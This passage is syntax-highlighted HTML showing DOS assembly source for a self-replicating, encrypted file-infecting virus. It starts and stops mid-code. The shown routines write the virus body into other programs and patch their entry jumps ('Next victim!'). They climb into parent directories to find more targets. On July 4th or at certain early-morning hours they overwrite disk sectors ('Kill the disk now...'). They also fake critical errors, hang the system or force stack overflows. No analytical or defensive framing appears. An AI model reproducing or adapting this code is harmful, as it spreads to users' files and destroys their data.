        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, try again...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Save call location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Write 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Point to buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Save the first 4 bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Get code number</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">              </span><span class="sc1">;add 1</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;increment if it's zero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">;Save new code number</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eof</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">  </span><span class="sc1">;Length of target code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Point to virus start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectIt</span><span class="sc0">            </span><span class="sc1">;Exempt from encryption</span><span class="sc0">
</span><span class="sc5">ComeBackHere</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">;LSeek to TOF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to LSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">addr</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Retrieve location</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;Adjust location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">address</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;address to call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">;JMP rel16 inst.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">],</span><span class="sc5">idc</span><span class="sc0">  </span><span class="sc1">;EOFMARK</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;Write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Write 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;4 bytes are at [DX]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Write to file</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;increment counter</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">max2kill</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;decrement counter</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;If 0 then End</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;change code #</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;adjust if 0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nextfile</span><span class="sc0">                </span><span class="sc1">;Next victim!</span><span class="sc0">

</span><span class="sc5">NoneLeft</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;At least 3 infected?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;The party's over!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;DI= 100h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">     </span><span class="sc1">;an INT 20h?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;Don't go to prev. dir.</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prevdir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;'..'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">              </span><span class="sc1">;Set current directory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;CHDIR ..</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">TheEnd</span><span class="sc0">              </span><span class="sc1">;We're through!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">            </span><span class="sc1">;Start over in new dir</span><span class="sc0">

</span><span class="sc5">TheEnd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;DI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;ES= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">              </span><span class="sc1">;Get date</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Do it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;4th of the month?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test2</span><span class="sc0">               </span><span class="sc1">;Nope, second test</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">;July?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test2</span><span class="sc0">               </span><span class="sc1">;Nope, second test</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;Sector 0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Kill</span><span class="sc0">                </span><span class="sc1">;Kill the disk now...</span><span class="sc0">

</span><span class="sc5">test2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">              </span><span class="sc1">;Get time</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Do it</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">               </span><span class="sc1">;On the hour? (x:00 xM)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GiveUp</span><span class="sc0">              </span><span class="sc1">;Return to program</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                </span><span class="sc1">;Midnight to 5 AM ???</span><span class="sc0">
        </span><span class="sc6">jnl</span><span class="sc0"> </span><span class="sc5">GiveUp</span><span class="sc0">              </span><span class="sc1">;Return to program</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">               </span><span class="sc1">;Add first number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;Transfer to AX</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                 </span><span class="sc1">;Zero out AH</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">               </span><span class="sc1">;Add DL to AL</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">;Add DL and carry flag</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;Add carry to AH</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;AX = 0 ???</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Kill</span><span class="sc0">                </span><span class="sc1">;Kill the disk now...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;Well, adjust first...</span><span class="sc0">

</span><span class="sc5">Kill</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;Sector number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;One at a time....</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;Point at PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">              </span><span class="sc1">;Get current disk</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">             </span><span class="sc1">;Now kill the disk</span><span class="sc0">
        
</span><span class="sc5">GiveUp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message_table</span><span class="sc0">     </span><span class="sc1">;point to table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">              </span><span class="sc1">;Get time</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">              </span><span class="sc1">;(0-59)</span><span class="sc0">

</span><span class="sc5">timeloop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">msgs</span><span class="sc0">             </span><span class="sc1">;mapped yet?</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">  </span><span class="sc5">timedone</span><span class="sc0">            </span><span class="sc1">;Yes, jump</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">msgs</span><span class="sc0">             </span><span class="sc1">;try to map it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">timeloop</span><span class="sc0">          </span><span class="sc1">;and check out work</span><span class="sc0">

</span><span class="sc5">timedone</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">               </span><span class="sc1">;AL gets msg #</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;Save in CL for CritErr</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                 </span><span class="sc1">;AH gets 0</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;AX = AX * 2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;BX = index</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;SI points to string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;CH is technique #</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;DX points to string</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Display string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">terminate</span><span class="sc0">            </span><span class="sc1">;Terminate program?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">TerminateProg</span><span class="sc0">           </span><span class="sc1">;Nope, next test</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">halt</span><span class="sc0">             </span><span class="sc1">;Halt program?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Hang system if ch=halt</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">SimulateCritErr</span><span class="sc0">      </span><span class="sc1">;Simulate CritErr?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">simulate</span><span class="sc0">            </span><span class="sc1">;yes, go do it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">Return2host</span><span class="sc0">          </span><span class="sc1">;Return to host?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ResumeProgram</span><span class="sc0">           </span><span class="sc1">;yes, go do it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">FlashFloppy</span><span class="sc0">          </span><span class="sc1">;Flash drive A:?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FlashFlop</span><span class="sc0">           </span><span class="sc1">;Yes, go do it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">WaitKey</span><span class="sc0">          </span><span class="sc1">;Wait for keypress?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">zwait</span><span class="sc0">               </span><span class="sc1">;Yes, go do it</span><span class="sc0">
 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">PauseKey</span><span class="sc0">         </span><span class="sc1">;Pause message w/ wait?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">zpause</span><span class="sc0">              </span><span class="sc1">;Yes, go do it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">StackError</span><span class="sc0">           </span><span class="sc1">;Stack overflow?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StackErr</span><span class="sc0">            </span><span class="sc1">;Yes, go do it</span><span class="sc0">

    </span><span class="sc1">;Invalid code, assume Return2host</span><span class="sc0">

</span><span class="sc5">ResumeProgram</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">              </span><span class="sc1">;Return to caller</span><span class="sc0">
</span><span class="sc5">StackErr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Cause stack overflow</span><span class="sc0">
</span><span class="sc5">TerminateProg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;Yep, all done!</span><span class="sc0">

</span><span class="sc5">simulate</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ARIFmsg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Abort, Retry ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;Input a char</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;crlf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">              </span><span class="sc1">;Uppercase?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">uppercase</span><span class="sc0">           </span><span class="sc1">;Nope, jump</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">              </span><span class="sc1">;Yes, make uppercase</span><span class="sc0">

</span><span class="sc5">uppercase</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">              </span><span class="sc1">;Abort?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">terminateprog</span><span class="sc0">           </span><span class="sc1">;Yep, go do it.</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc0">              </span><span class="sc1">;Retry?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">zskip</span><span class="sc0">               </span><span class="sc1">;skip over "retry" code</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Point to crlf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">               </span><span class="sc1">;Restore DH from CL</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">timedone</span><span class="sc0">            </span><span class="sc1">;Reprint error</span><span class="sc0">

</span><span class="sc5">zskip</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc0">              </span><span class="sc1">;Ignore?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ResumeProgram</span><span class="sc0">           </span><span class="sc1">;Return to host program</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'F'</span><span class="sc0">              </span><span class="sc1">;Fail?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">simulate</span><span class="sc0">            </span><span class="sc1">;Invalid response</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fail24</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Point to fail string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;Terminate program</span><span class="sc0">

</span><span class="sc5">FlashFlop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;Wait for keypress</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;Drive A:</span><span class="sc0">
